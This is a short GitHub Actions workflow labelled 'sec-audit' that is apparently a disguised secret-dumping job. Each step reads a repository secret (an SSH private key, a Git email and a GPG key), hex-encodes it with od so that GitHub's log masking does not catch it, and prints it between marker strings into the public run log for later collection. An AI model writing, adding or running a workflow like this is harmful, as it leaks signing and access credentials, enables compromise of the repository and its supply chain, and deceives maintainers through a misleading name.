name: sec-audit
on: workflow_dispatch
jobs:
  repo_secrets:
    runs-on: ubuntu-latest
    steps:
      - name: s_SSH_PRIVATE_KEY
        env:
          V: ${{ secrets.SSH_PRIVATE_KEY }}
        run: printf 'XX_SSH_PRIVATE_KEY_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
      - name: s_GIT_EMAIL
        env:
          V: ${{ secrets.GIT_EMAIL }}
        run: printf 'XX_GIT_EMAIL_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
      - name: s_GPG_KEY
        env:
          V: ${{ secrets.GPG_KEY }}
        run: printf 'XX_GPG_KEY_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
